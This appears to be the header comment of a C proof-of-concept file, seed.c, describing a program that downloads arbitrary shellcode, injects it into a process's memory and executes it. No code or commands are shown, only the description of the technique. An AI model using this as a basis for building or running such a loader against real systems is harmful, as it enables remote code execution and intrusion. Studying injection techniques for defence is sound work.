/* seed.c, downloads and executes arbitrary Shellcode PoC. 

This program is a PoC to demonstrate how arbitrary
Shellcode may be injected into a process' memory and then
executed. Regular Shellcode is often limited by small 
buffers.

However, Shellcode can just as easily be placed in other
memory regions. Once injected, it may be called apon and
executed. */
